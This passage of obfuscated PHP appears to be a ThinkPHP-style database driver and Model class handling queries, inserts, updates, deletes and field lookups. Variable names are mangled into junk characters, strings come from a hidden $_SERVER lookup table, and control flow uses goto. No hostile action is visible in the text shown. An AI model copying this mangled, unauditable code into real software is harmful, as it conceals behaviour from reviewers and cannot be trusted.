= array(); if ($this->numRows > 0) { for ($¾”åØÈÈ = 0; $¾”åØÈÈ < $this->numRows; $¾”åØÈÈ++) { $Ê’¯­Åô[$¾”åØÈÈ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Ê’¯­Åô; } public function getFields($Û»¨ÀÁ) { $ËçËıÈ =& $_SERVER[Ôó‡è­ƒ]; $¼¦–‘Ğ = $this->query($ËçËıÈ[897] . $this->parseKey($Û»¨ÀÁ)); $Ê‚Ì„¨Å = array(); if ($¼¦–‘Ğ) { foreach ($¼¦–‘Ğ as $ŞçÔàç => $ÌÀ·ÇŞ¦) { $Ê‚Ì„¨Å[$ÌÀ·ÇŞ¦[$ËçËıÈ[31]]] = array($ËçËıÈ[32] => $ÌÀ·ÇŞ¦[$ËçËıÈ[31]], $ËçËıÈ[33] => $ÌÀ·ÇŞ¦[$ËçËıÈ[34]], $ËçËıÈ[35] => (bool) ($ÌÀ·ÇŞ¦[$ËçËıÈ[36]] === $ËçËıÈ[12]), $ËçËıÈ[37] => $ÌÀ·ÇŞ¦[$ËçËıÈ[38]], $ËçËıÈ[39] => strtolower($ÌÀ·ÇŞ¦[$ËçËıÈ[40]]) == $ËçËıÈ[41], $ËçËıÈ[42] => strtolower($ÌÀ·ÇŞ¦[$ËçËıÈ[43]]) == $ËçËıÈ[44]); } } return $Ê‚Ì„¨Å; } public function getTables($¬—”Ş›Õ = '') { $¥¹‡¤çÑ =& $_SERVER[Ôó‡è­ƒ]; $ÊÂÙ¨× = !empty($¬—”Ş›Õ) ? $¥¹‡¤çÑ[899] . $¬—”Ş›Õ . $¥¹‡¤çÑ[900] : $¥¹‡¤çÑ[901]; $»¿àªãÒ = $this->query($ÊÂÙ¨×); $ıÔµÇî  = array(); if ($»¿àªãÒ) { foreach ($»¿àªãÒ as $½€Ö•ı => $´ä‚„Ÿ«) { $ıÔµÇî [$½€Ö•ı] = current($´ä‚„Ÿ«); } } return $ıÔµÇî ; } public function replace($¬ÕĞâóõ, $äŒ°¤Ä = array()) { $°—Â·«Ë =& $_SERVER[Ôó‡è­ƒ]; foreach ($¬ÕĞâóõ as $ÙÉı¶ôô => $êòıÜØô) { $”ƒ—˜¬Û = $this->parseValue($êòıÜØô); if (is_scalar($”ƒ—˜¬Û)) { $Š‰¤’ã[] = $”ƒ—˜¬Û; $®æ¥Ú¹[] = $this->parseKey($ÙÉı¶ôô); } } $¬·üª«õ = $°—Â·«Ë[902] . $this->parseTable($äŒ°¤Ä[$°—Â·«Ë[278]]) . $°—Â·«Ë[903] . implode($°—Â·«Ë[50], $®æ¥Ú¹) . $°—Â·«Ë[904] . implode($°—Â·«Ë[50], $Š‰¤’ã) . $°—Â·«Ë[905]; return $this->execute($¬·üª«õ); } public function insertAll($ÁŒèë½ï, $¤•õ”ğï = array(), $²àÀ¸ÆÙ = false) { $˜ªŒÂá =& $_SERVER[Ôó‡è­ƒ]; if (!is_array($ÁŒèë½ï[0])) { return !1; } $¯õ§ª³ß = array_keys($ÁŒèë½ï[0]); $ù÷ä¿™¯ = array(); foreach ($ÁŒèë½ï as $­êÎÓ·à) { $¸Èü¬¤ğ = array(); foreach ($­êÎÓ·à as $Â§Œß¿ => $â³š£Ù¡) { $â³š£Ù¡ = $this->parseValue($â³š£Ù¡); if (is_scalar($â³š£Ù¡)) { $¸Èü¬¤ğ[] = $â³š£Ù¡; } } $ù÷ä¿™¯[] = $˜ªŒÂá[259] . implode($˜ªŒÂá[50], $¸Èü¬¤ğ) . $˜ªŒÂá[905]; } array_walk($¯õ§ª³ß, array($this, $˜ªŒÂá[906])); $ê©‚ÅìÔ = $²àÀ¸ÆÙ ? $˜ªŒÂá[907] : $˜ªŒÂá[908]; $—‚Å·à’ = $ê©‚ÅìÔ . $˜ªŒÂá[909] . $this->parseTable($¤•õ”ğï[$˜ªŒÂá[278]]) . $˜ªŒÂá[903] . implode($˜ªŒÂá[50], $¯õ§ª³ß) . $˜ªŒÂá[910] . implode($˜ªŒÂá[50], $ù÷ä¿™¯); return $this->execute($—‚Å·à’); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ë¢½¹¡ş =& $_SERVER[Ôó‡è­ƒ]; $this->error = $this->_linkID->errno . $ë¢½¹¡ş[4] . $this->_linkID->error; if ($ë¢½¹¡ş[12] != $this->queryStr) { $this->error .= LNG($ë¢½¹¡ş[48]) . $this->queryStr; } think_trace($this->error, $ë¢½¹¡ş[12], $ë¢½¹¡ş[49]); return $this->error; } public function escapeString($Í¯º£»´) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Í¯º£»´); } else { return addslashes($Í¯º£»´); } } public function parseKey(&$ßŒüõİ, $´ûˆÑÉê = true) { $Ç¶áÒõÆ =& $_SERVER[Ôó‡è­ƒ]; if ($´ûˆÑÉê) { $ßŒüõİ = $this->parseKeyCheck($ßŒüõİ); } if ($ßŒüõİ != $Ç¶áÒõÆ[185] && !preg_match($Ç¶áÒõÆ[911], $ßŒüõİ)) { $ßŒüõİ = $Ç¶áÒõÆ[384] . trim($ßŒüõİ, $Ç¶áÒõÆ[384]) . $Ç¶áÒõÆ[384]; } return $ßŒüõİ; } } goto b…ƒ¼¶›Ğ‰; aøµ¹ÀÉÚÓ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\154\x65", "\157\x72\144\145\x72", "\x61\154\x69\x61\x73", "\x68\141\166\151\156\147", "\147\162\x6f\x75\x70", "\x6c\157\143\x6b", "\144\x69\x73\x74\x69\x6e\143\x74", "\141\165\164\157", "\146\x69\x6c\x74\x65\x72", "\166\141\x6c\151\144\x61\164\145", "\162\x65\163\165\x6c\x74", "\x62\151\x6e\x64", "\x74\157\x6b\145\156"); public function __construct($°òº‹ = '', $ìõÒÂÅ = '', $ßÃÖ½ÌÒ = '') { $Û‚ô®Ÿ¡ =& $_SERVER[Ôó‡è­ƒ]; $this->_initialize(); if (!empty($°òº‹)) { if (strpos($°òº‹, $Û‚ô®Ÿ¡[10])) { list($this->dbName, $this->name) = explode($Û‚ô®Ÿ¡[10], $°òº‹); } else { $this->name = $°òº‹; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ìõÒÂÅ)) { $this->tablePrefix = $Û‚ô®Ÿ¡[12]; } elseif ($Û‚ô®Ÿ¡[12] != $ìõÒÂÅ) { $this->tablePrefix = $ìõÒÂÅ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Û‚ô®Ÿ¡[243]); } $this->db(0, empty($this->connection) ? $ßÃÖ½ÌÒ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÑÆ°¶ßº =& $_SERVER[Ôó‡è­ƒ]; if (empty($this->fields)) { if (think_config($ÑÆ°¶ßº[244])) { $ªÜÍï° = $this->dbName ? $this->dbName : think_config($ÑÆ°¶ßº[245]); $ËÓ²·¦× = think_var_cache($ÑÆ°¶ßº[246] . strtolower(get_path_this($ªÜÍï°) . $ÑÆ°¶ßº[10] . $this->name)); if ($ËÓ²·¦×) { $ÙÓ´Àú = think_config($ÑÆ°¶ßº[247]); if (empty($ÙÓ´Àú) || $ËÓ²·¦×[$ÑÆ°¶ßº[248]] == $ÙÓ´Àú) { $this->fields = $ËÓ²·¦×; return; } } } $this->flush(); } } public function flush() { $‰à°Ÿ×« =& $_SERVER[Ôó‡è­ƒ]; $this->db->setModel($this->name); $âÙŞÁÖÈ = $this->db->getFields($this->getTableName()); if (!$âÙŞÁÖÈ) { return !1; } $this->fields = array_keys($âÙŞÁÖÈ); $this->fields[$‰à°Ÿ×«[249]] = !1; foreach ($âÙŞÁÖÈ as $÷¹¦Î²ˆ => $úù¤ë·) { $şÇúÆ´[$÷¹¦Î²ˆ] = $úù¤ë·[$‰à°Ÿ×«[33]]; if ($úù¤ë·[$‰à°Ÿ×«[39]]) { $this->fields[$‰à°Ÿ×«[250]] = $÷¹¦Î²ˆ; if ($úù¤ë·[$‰à°Ÿ×«[42]]) { $this->fields[$‰à°Ÿ×«[249]] = !0; } } } $this->fields[$‰à°Ÿ×«[251]] = $şÇúÆ´; if (think_config($‰à°Ÿ×«[247])) { $this->fields[$‰à°Ÿ×«[248]] = think_config($‰à°Ÿ×«[247]); } if (think_config($‰à°Ÿ×«[244])) { $œÂõí = $this->dbName ? $this->dbName : think_config($‰à°Ÿ×«[245]); think_var_cache($‰à°Ÿ×«[246] . strtolower(get_path_this($œÂõí) . $‰à°Ÿ×«[10] . $this->name), $this->fields); } } public function switchModel($ğ±ô», $Éä½ÚÆ = array()) { $ûÚ¨¡•Â =& $_SERVER[Ôó‡è­ƒ]; $Ú ı·ä± = ucwords(strtolower($ğ±ô»)) . $ûÚ¨¡•Â[252]; if (!class_exists($Ú ı·ä±)) { think_exception($Ú ı·ä± . think_lang($ûÚ¨¡•Â[253])); } $this->_extModel = new $Ú ı·ä±($this->name); if (!empty($Éä½ÚÆ)) { foreach ($Éä½ÚÆ as $ÑøÚ¡) { $this->_extModel->setProperty($ÑøÚ¡, $this->{$ÑøÚ¡}); } } return $this->_extModel; } public function __set($ÌÏ¤«, $¾µÜå¹‚) { $this->data[$ÌÏ¤«] = $¾µÜå¹‚; } public function __get($Å‰Ş§›…) { return isset($this->data[$Å‰Ş§›…]) ? $this->data[$Å‰Ş§›…] : null; } public function __isset($øÈı¼º¬) { return isset($this->data[$øÈı¼º¬]); } public function __unset($ü³‡©Îê) { unset($this->data[$ü³‡©Îê]); } public function __call($§…ÑúƒÌ, $Ÿ¥ş¿µ¡) { $œ¯Øã–Ë =& $_SERVER[Ôó‡è­ƒ]; if (in_array(strtolower($§…ÑúƒÌ), $this->methods, !0)) { $this->options[strtolower($§…ÑúƒÌ)] = $Ÿ¥ş¿µ¡[0]; return $this; } elseif (in_array(strtolower($§…ÑúƒÌ), array($œ¯Øã–Ë[254], $œ¯Øã–Ë[255], $œ¯Øã–Ë[256], $œ¯Øã–Ë[257], $œ¯Øã–Ë[258]), !0)) { $¿Å¤ÎÎ = isset($Ÿ¥ş¿µ¡[0]) ? $Ÿ¥ş¿µ¡[0] : $œ¯Øã–Ë[185]; $¿Å¤ÎÎ = $this->db->parseKey($¿Å¤ÎÎ); return $this->getField(strtoupper($§…ÑúƒÌ) . $œ¯Øã–Ë[259] . $¿Å¤ÎÎ . $œ¯Øã–Ë[260] . $§…ÑúƒÌ, $œ¯Øã–Ë[254]); } elseif (strtolower(substr($§…ÑúƒÌ, 0, 5)) == $œ¯Øã–Ë[261]) { $¿Å¤ÎÎ = think_parse_name(substr($§…ÑúƒÌ, 5)); $‘¦ÈÖ“»[$¿Å¤ÎÎ] = $Ÿ¥ş¿µ¡[0]; return $this->where($‘¦ÈÖ“»)->find(); } elseif (strtolower(substr($§…ÑúƒÌ, 0, 10)) == $œ¯Øã–Ë[262]) { $×úŸ…Ù = think_parse_name(substr($§…ÑúƒÌ, 10)); $‘¦ÈÖ“»[$×úŸ…Ù] = $Ÿ¥ş¿µ¡[0]; return $this->where($‘¦ÈÖ“»)->getField($Ÿ¥ş¿µ¡[1]); } elseif (isset($this->_scope[$§…ÑúƒÌ])) { return $this->scope($§…ÑúƒÌ, $Ÿ¥ş¿µ¡[0]); } elseif (method_exists($this, $§…ÑúƒÌ)) { array_unshift($Ÿ¥ş¿µ¡, $§…ÑúƒÌ); return call_user_func_array(array($this, $œ¯Øã–Ë[263]), $Ÿ¥ş¿µ¡); } else { return call_user_func_array(array(parent, $§…ÑúƒÌ), $Ÿ¥ş¿µ¡); } } protected function call() { $”ÌÜ¼—™ =& $_SERVER[Ôó‡è­ƒ]; $Òö‡½ÓÈ = func_get_args(); $œ’ÙŞêã = array_shift($Òö‡½ÓÈ); $ôŠ—×­ã = $œ’ÙŞêã; if (is_array($œ’ÙŞêã)) { $ôŠ—×­ã = $œ’ÙŞêã[1]; $œ’ÙŞêã = $œ’ÙŞêã[0]; } $‹ˆåŠß = count($Òö‡½ÓÈ) - 1; if (isset($Òö‡½ÓÈ[$‹ˆåŠß]) && $Òö‡½ÓÈ[$‹ˆåŠß] === $œ’ÙŞêã) { think_exception(__CLASS__ . $”ÌÜ¼—™[4] . $œ’ÙŞêã . think_lang($”ÌÜ¼—™[264])); return; } $Òö‡½ÓÈ[] = $œ’ÙŞêã; if (method_exists($this, $”ÌÜ¼—™[265])) { $‡±‹Î“ = call_user_func_array(array($this, $”ÌÜ¼—™[266]), array($ôŠ—×­ã, $Òö‡½ÓÈ)); if (!is_null($‡±‹Î“) && $‡±‹Î“ !== !1) { return $‡±‹Î“; } } $Ü”Àå¤î = call_user_func_array(array($this, $œ’ÙŞêã), $Òö‡½ÓÈ); if (method_exists($this, $”ÌÜ¼—™[267])) { $‡±‹Î“ = call_user_func_array(array($this, $”ÌÜ¼—™[268]), array($ôŠ—×­ã, $Òö‡½ÓÈ, $Ü”Àå¤î)); if ($‡±‹Î“) { return $‡±‹Î“; } } return $Ü”Àå¤î; } protected function _initialize() { } protected function _facade($Œ„ÇÄó­) { $Ç™Á£—Ÿ =& $_SERVER[Ôó‡è­ƒ]; if (!empty($this->fields)) { foreach ($Œ„ÇÄó­ as $å§ƒŠ => $€ÇôÀ½–) { if (is_array($this->fields) && !in_array($å§ƒŠ, $this->fields, !0)) { unset($Œ„ÇÄó­[$å§ƒŠ]); } elseif (is_scalar($€ÇôÀ½–)) { $this->_parseType($Œ„ÇÄó­, $å§ƒŠ); } } } if (!empty($this->options[$Ç™Á£—Ÿ[269]])) { $Œ„ÇÄó­ = array_map($this->options[$Ç™Á£—Ÿ[269]], $Œ„ÇÄó­); unset($this->options[$Ç™Á£—Ÿ[269]]); } $this->_beforeWrite($Œ„ÇÄó­); return $Œ„ÇÄó­; } protected function _beforeWrite(&$„«Œ²ş˜) { } public function add($Ø–©ş¬ö = '', $ÅÜšµİ = array(), $ŠØ‘—Ê£ = false) { if (empty($Ø–©ş¬ö)) { if (!empty($this->data)) { $Ø–©ş¬ö = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ôó‡è­ƒ][270]); return !1; } } $ÅÜšµİ = $this->_parseOptions($ÅÜšµİ); $Ø–©ş¬ö = $this->_facade($Ø–©ş¬ö); if (!1 === $this->_beforeInsert($Ø–©ş¬ö, $ÅÜšµİ)) { return !1; } $è°áªÁö = $this->db->insert($Ø–©ş¬ö, $ÅÜšµİ, $ŠØ‘—Ê£); if (!1 !== $è°áªÁö) { $¨Ä˜şÆò = $this->getLastInsID(); if ($¨Ä˜şÆò) { $Ø–©ş¬ö[$this->getPk()] = $¨Ä˜şÆò; $this->_after_insert($Ø–©ş¬ö, $ÅÜšµİ); return $¨Ä˜şÆò; } $this->_after_insert($Ø–©ş¬ö, $ÅÜšµİ); } return $è°áªÁö; } protected function _beforeInsert(&$ÅŠ«¡¼, $úÒ‚ü™¥) { } protected function _after_insert($¤óÑëÓ, $±ä‡æ‘«) { } public function addAll($ÌÕÎ‚í, $Ü³òõÊ‡ = array(), $…Ùû¡½ = false) { $Æí´¥£– =& $_SERVER[Ôó‡è­ƒ]; if (empty($ÌÕÎ‚í)) { $this->error = think_lang($Æí´¥£–[270]); return !1; } $Ü³òõÊ‡ = $this->_parseOptions($Ü³òõÊ‡); foreach ($ÌÕÎ‚í as $˜üœ¯íÓ => $ŒÖÛüú±) { $ÌÕÎ‚í[$˜üœ¯íÓ] = $this->_facade($ŒÖÛüú±); } if (method_exists($this->db, $Æí´¥£–[271])) { $©ìë×Êğ = $this->db->insertAll($ÌÕÎ‚í, $Ü³òõÊ‡, $…Ùû¡½); } else { $this->startTrans(); foreach ($ÌÕÎ‚í as $˜üœ¯íÓ => $ŒÖÛüú±) { $©ìë×Êğ = $this->db->insert($ŒÖÛüú±, $Ü³òõÊ‡, $…Ùû¡½); } $this->commit(); } if (!1 !== $©ìë×Êğ) { $Ç ö¸¯– = $this->getLastInsID(); if ($Ç ö¸¯–) { return $Ç ö¸¯–; } } return $©ìë×Êğ; } public function selectAdd($¶¥ù›…µ = '', $š‘‡À¼¶ = '', $–ˆ­€¤Œ = array()) { $Ñµ©–õ‚ =& $_SERVER[Ôó‡è­ƒ]; $–ˆ­€¤Œ = $this->_parseOptions($–ˆ­€¤Œ); if (!1 === ($éÍÁï© = $this->db->selectInsert($¶¥ù›…µ ? $¶¥ù›…µ : $–ˆ­€¤Œ[$Ñµ©–õ‚[272]], $š‘‡À¼¶ ? $š‘‡À¼¶ : $this->getTableName(), $–ˆ­€¤Œ))) { $this->error = think_lang($Ñµ©–õ‚[273]); return !1; } else { return $éÍÁï©; } } public function save($•®˜Š¬Ü = '', $äûˆù±ç = array()) { $Å½•İÒ¼ =& $_SERVER[Ôó‡è­ƒ]; if (empty($•®˜Š¬Ü)) { if (!empty($this->data)) { $•®˜Š¬Ü = $this->data; $this->data = array(); } else { $this->error = think_lang($Å½•İÒ¼[270]); return !1; } } $•®˜Š¬Ü = $this->_facade($•®˜Š¬Ü); $äûˆù±ç = $this->_parseOptions($äûˆù±ç); $ÃŞé‰é = $this->getPk(); if (!isset($äûˆù±ç[$Å½•İÒ¼[274]])) { if (isset($•®˜Š¬Ü[$ÃŞé‰é])) { $¹õ²‡¢ª[$ÃŞé‰é] = $•®˜Š¬Ü[$ÃŞé‰é]; $äûˆù±ç[$Å½•İÒ¼[274]] = $¹õ²‡¢ª; unset($•®˜Š¬Ü[$ÃŞé‰é]); } else { $this->error = think_lang($Å½•İÒ¼[273]); return !1; } } if (is_array($äûˆù±ç[$Å½•İÒ¼[274]]) && isset($äûˆù±ç[$Å½•İÒ¼[274]][$ÃŞé‰é])) { $¤Ü–íı“ = $äûˆù±ç[$Å½•İÒ¼[274]][$ÃŞé‰é]; } if (!1 === $this->_beforeUpdate($•®˜Š¬Ü, $äûˆù±ç)) { return !1; } $¡²âÔœŞ = $this->db->update($•®˜Š¬Ü, $äûˆù±ç); if (!1 !== $¡²âÔœŞ) { if (isset($¤Ü–íı“)) { $•®˜Š¬Ü[$ÃŞé‰é] = $¤Ü–íı“; } $this->_afterUpdate($•®˜Š¬Ü, $äûˆù±ç); } return $¡²âÔœŞ; } protected function _beforeUpdate(&$Àª–£§ö, $ÔîÓÈ¯Ù) { } protected function _afterUpdate($±õË°”, $È×áçª) { } public function delete($×ì¥şú¼ = array()) { $˜­ÕùÏ« =& $_SERVER[Ôó‡è­ƒ]; if (empty($×ì¥şú¼) && empty($this->options[$˜­ÕùÏ«[274]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $şÉã€üë = $this->getPk(); if (is_numeric($×ì¥şú¼) || is_string($×ì¥şú¼)) { if (strpos($×ì¥şú¼, $˜­ÕùÏ«[50])) { $ß˜ÅæÒê[$şÉã€üë] = array($˜­ÕùÏ«[275], $×ì¥şú¼); } else { $ß˜ÅæÒê[$şÉã€üë] = $×ì¥şú¼; } $this->options[$˜­ÕùÏ«[274]] = $ß˜ÅæÒê; } $×ì¥şú¼ = $this->_parseOptions(); if (is_array($×ì¥şú¼[$˜­ÕùÏ«[274]]) && isset($×ì¥şú¼[$˜­ÕùÏ«[274]][$şÉã€üë])) { $œŠ¾“æÁ = $×ì¥şú¼[$˜­ÕùÏ«[274]][$şÉã€üë]; } $‹ö¼‰¸¹ = $this->db->delete($×ì¥şú¼); if (!1 !== $‹ö¼‰¸¹) { $Åú²€“˜ = array(); if (isset($œŠ¾“æÁ)) { $Åú²€“˜[$şÉã€üë] = $œŠ¾“æÁ; } $this->_after_delete($Åú²€“˜, $×ì¥şú¼); } return $‹ö¼‰¸¹; } protected function _after_delete($¢»ßõş, $·†íõˆá) { } public function select($ÙœÚŸŠŸ = array()) { $ÈÛšÑŞˆ =& $_SERVER[Ôó‡è­ƒ]; if (is_string($ÙœÚŸŠŸ) || is_numeric($ÙœÚŸŠŸ)) { $ğ€ˆÊÎ = $this->getPk(); if (strpos($ÙœÚŸŠŸ, $ÈÛšÑŞˆ[50])) { $İ¹¼Õ¢¯[$ğ€ˆÊÎ] = array($ÈÛšÑŞˆ[275], $ÙœÚŸŠŸ); } else { $İ¹¼Õ¢¯[$ğ€ˆÊÎ] = $ÙœÚŸŠŸ; } $this->options[$ÈÛšÑŞˆ[274]] = $İ¹¼Õ¢¯; } elseif (!1 === $ÙœÚŸŠŸ) { $ÙœÚŸŠŸ = $this->_parseOptions(); return $ÈÛšÑŞˆ[276] . $this->db->buildSelectSql($ÙœÚŸŠŸ) . $ÈÛšÑŞˆ[277]; } $ÙœÚŸŠŸ = $this->_parseOptions(); $¨æÂİ„Ì = $this->db->select($ÙœÚŸŠŸ); if (!1 === $¨æÂİ„Ì) { return !1; } if (empty($¨æÂİ„Ì)) { return null; } $this->_afterSelect($¨æÂİ„Ì, $ÙœÚŸŠŸ); return $¨æÂİ„Ì; } protected function _afterSelect(&$‡Òù÷óğ, $Çµì„ôğ) { } public function buildSql($óîÏÛ£ = array()) { $ß”¾¸ğÃ =& $_SERVER[Ôó‡è­ƒ]; $óîÏÛ£ = $this->_parseOptions($óîÏÛ£); return $ß”¾¸ğÃ[276] . $this->db->buildSelectSql($óîÏÛ£) . $ß”¾¸ğÃ[277]; } public function optionsValue($İ×úáö† = null) { if (is_null($İ×úáö†)) { return $this->options; } elseif (is_array($İ×úáö†)) { $this->options = array_merge($this->options, $İ×úáö†); } } protected function _parseOptions($½Í‘Åıš = array()) { $ñ©î„Œ =& $_SERVER[Ôó‡è­ƒ]; if (is_array($½Í‘Åıš)) { $½Í‘Åıš = array_merge($this->options, $½Í‘Åıš); } $this->options = array(); if (!isset($½Í‘Åıš[$ñ©î„Œ[278]])) { $½Í‘Åıš[$ñ©î„Œ[278]] = $this->getTableName(); $“ıËİùú = $this->fields; } else { $“ıËİùú = $this->getDbFields(); } if (!empty($½Í‘Åıš[$ñ©î„Œ[279]])) { $½Í‘Åıš[$ñ©î„Œ[278]] .= $ñ©î„Œ[53] . $½Í‘Åıš[$ñ©î„Œ[279]]; } $½Í‘Åıš[$ñ©î„Œ[280]] = $this->name; if (isset($½Í‘Åıš[$ñ©î„Œ[274]]) && is_array($½Í‘Åıš[$ñ©î„Œ[274]]) && !empty($“ıËİùú) && !isset($½Í‘Åıš[$ñ©î„Œ[281]]) && !isset($½Í‘Åıš[$ñ©î„Œ[278]])) { foreach ($½Í‘Åıš[$ñ©î„Œ[274]] as $·ÑàšÚ => $„äğÇ») { $·ÑàšÚ = trim($·ÑàšÚ); if (in_array($·ÑàšÚ, $“ıËİùú, !0)) { if (is_scalar($„äğÇ»)) { $this->_parseType($½Í‘Åıš[$ñ©î„Œ[274]], $·ÑàšÚ); } } elseif (!is_numeric($·ÑàšÚ) && $ñ©î„Œ[11] != substr($·ÑàšÚ, 0, 1) && !1 === strpos($·ÑàšÚ, $ñ©î„Œ[10]) && !1 === strpos($·ÑàšÚ, $ñ©î„Œ[259]) && !1 === strpos($·ÑàšÚ, $ñ©î„Œ[282]) && !1 === strpos($·ÑàšÚ, $ñ©î„Œ[283])) { unset($½Í‘Åıš[$ñ©î„Œ[274]][$·ÑàšÚ]); } } } $this->_options_filter($½Í‘Åıš); return $½Í‘Åıš; } protected function _options_filter(&$ Ï•˜ŞÒ) { } protected function _parseType(&$ƒŞÜŸ€, $˜İ¿›š) { $‡ùö×£Â =& $_SERVER[Ôó‡è­ƒ]; if (empty($this->options[$‡ùö×£Â[284]][$‡ùö×£Â[4] . $˜İ¿›š])) { $•Ê÷¯Ø = strtolower($this->fields[$‡ùö×£Â[251]][$˜İ¿›š]); if (!1 !== strpos($•Ê÷¯Ø, $‡ùö×£Â[285])) { } elseif (!1 === strpos($•Ê÷¯Ø, $‡ùö×£Â[286]) && !1 !== strpos($•Ê÷¯Ø, $‡ùö×£Â[287])) { $ƒŞÜŸ€[$˜İ¿›š] = intval($ƒŞÜŸ€[$˜İ¿›š]); } elseif (!1 !== strpos($•Ê÷¯Ø, $‡ùö×£Â[288]) || !1 !== strpos($•Ê÷¯Ø, $‡ùö×£Â[289])) { $ƒŞÜŸ€[$˜İ¿›š] = floatval($ƒŞÜŸ€[$˜İ¿›š]); } elseif (!1 !== strpos($•Ê÷¯Ø, $‡ùö×£Â[290])) { $ƒŞÜŸ€[$˜İ¿›š] = (bool) $ƒŞÜŸ€[$˜İ¿›š]; } } } public function find($›ª»ÒÊ = array()) { $äÕÀ’®æ =& $_SERVER[Ôó‡è­ƒ]; if (is_numeric($›ª»ÒÊ) || is_string($›ª»ÒÊ)) { $„¢†ùíä[$this->getPk()] = intval($›ª»ÒÊ); $this->options[$äÕÀ’®æ[274]] = $„¢†ùíä; } $this->options[$äÕÀ’®æ[291]] = 1; $›ª»ÒÊ = $this->_parseOptions(); $“†¡Üãú = $this->db->select($›ª»ÒÊ); if (!1 === $“†¡Üãú) { return !1; } if (empty($“†¡Üãú)) { return null; } $this->data = $“†¡Üãú[0]; $this->_afterFind($this->data, $›ª»ÒÊ); if (!empty($this->options[$äÕÀ’®æ[292]])) { return $this->returnResult($this->data, $this->options[$äÕÀ’®æ[292]]); } return $this->data; } protected function _afterFind(&$ç¼íµº°, $ÀÇÖ¡Ò) { } protected function returnResult($×‹ìÎ°¾, $ùÁ•ˆ¢Ú = '') { $­¿Õö–¶ =& $_SERVER[Ôó‡è­ƒ]; if ($ùÁ•ˆ¢Ú) { if (is_callable($ùÁ•ˆ¢Ú)) { return call_user_func($ùÁ•ˆ¢Ú, $×‹ìÎ°¾); } switch (strtolower($ùÁ•ˆ¢Ú)) { case $­¿Õö–¶[293]: return json_encode($×‹ìÎ°¾); case $­¿Õö–¶[294]: return xml_encode($×‹ìÎ°¾); } } return $×‹ìÎ°¾; } public function parseFieldsMap($ôî°°´Ä, $µÑ½úñ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $–»ïöÂ˜ => $Áñ—Ãïß) { if ($µÑ½úñ == 1) { if (isset($ôî°°´Ä[$Áñ—Ãïß])) { $ôî°°´Ä[$–»ïöÂ˜] = $ôî°°´Ä[$Áñ—Ãïß]; unset($ôî°°´Ä[$Áñ—Ãïß]); } } else { if (isset($ôî°°´Ä[$–»ïöÂ˜])) { $ôî°°´Ä[$Áñ—Ãïß] = $ôî°°´Ä[$–»ïöÂ˜]; unset($ôî°°´Ä[$–»ïöÂ˜]); } } } } return $ôî°°´Ä; } public function setField($Ï—¯Áüû, $¨¤×òçø = '') { if (is_array($Ï—¯Áüû)) { $Ÿ¬»›§µ = $Ï—¯Áüû; } else { $Ÿ¬»›§µ[$Ï—¯Áüû] = $¨¤×òçø; } return $this->save($Ÿ¬»›§µ); } public function setAdd($Ğ©Áïë‰, $¦ÎÜª‹ = 1) { $¡¿²´¢ =& $_SERVER[Ôó‡è­ƒ]; $õ–Ê™ = $Ğ©Áïë‰ . $¡¿²´¢[295] . $¦ÎÜª‹; if ($¦ÎÜª‹ < 0) { $õ–Ê™ = $Ğ©Áïë‰ . $¦ÎÜª‹; } return $this->setField($Ğ©Áïë‰, array($¡¿²´¢[296], $õ–Ê™)); } public function getField($œ—íçÂ†, $½ÒÏ¹•ù = null) { $æî“ ¯© =& $_SERVER[Ôó‡è­ƒ]; $°±…õ´˜[$æî“ ¯©[272]] = $œ—íçÂ†; $°±…õ´˜ = $this->_parseOptions($°±…õ´˜); $œ—íçÂ† = trim($œ—íçÂ†); if (strpos($œ—íçÂ†, $æî“ ¯©[50])) { if (!isset($°±…õ´˜[$æî“ ¯©[291]])) { $°±…õ´˜[$æî“ ¯©[291]] = is_numeric($½ÒÏ¹•ù) ? $½ÒÏ¹•ù : $æî“ ¯©[12]; } $¼èâÔÒŠ = $this->db->select($°±…õ´˜); if (!empty($¼èâÔÒŠ)) { $¸œæí‡³ = explode($æî“ ¯©[50], $œ—íçÂ†); $œ—íçÂ† = array_keys($¼èâÔÒŠ[0]); $”ˆÄ‹¨Ò = array_shift($œ—íçÂ†); $‰ÍÙ‚¶¸ = array_shift($œ—íçÂ†); $Ã¸ŒÙı = array(); $—»şÓ¤‚ = count($¸œæí‡³); foreach ($¼èâÔÒŠ as $ù•“â) { $é¤¯Ø©É = $ù•“â[$”ˆÄ‹¨Ò]; if (2 == $—»şÓ¤‚) { $Ã¸ŒÙı[$é¤¯Ø©É] = $ù•“â[$‰ÍÙ‚¶¸]; } else { $Ã¸ŒÙı[$é¤¯Ø©É] = is_string($½ÒÏ¹•ù) ? implode($½ÒÏ¹•ù, $ù•“â) : $ù•“â; } } return $Ã¸ŒÙı; } } else { if (!0 !== $½ÒÏ¹•ù) { $°±…õ´˜[$æî“ ¯©[291]] = is_numeric($½ÒÏ¹•ù) ? $½ÒÏ¹•ù : 1; } if ($½ÒÏ¹•ù === $æî“ ¯©[254]) { unset($°±…õ´˜[$æî“ ¯©[291]]); } $ù•“â = $this->db->select($°±…õ´˜); if (!empty($ù•“â)) { if ($½ÒÏ¹•ù === $æî“ ¯©[254]) { return reset($ù•“â[0]); } if (!0 !== $½ÒÏ¹•ù && 1 == $°±…õ´˜[$æî“ ¯©[291]]) { return reset($ù•“â[0]); } foreach ($ù•“â as $®¼ãšï¯) { $åğ÷ªêŠ[] = $®¼ãšï¯[$œ—íçÂ†]; } return $åğ÷ªêŠ; } } return null; } public function create($²„Ï×³ = '', $‹ÀÓ¦¡ = '') { $©áèÀï¶ =& $_SERVER[Ôó‡è­ƒ]; if 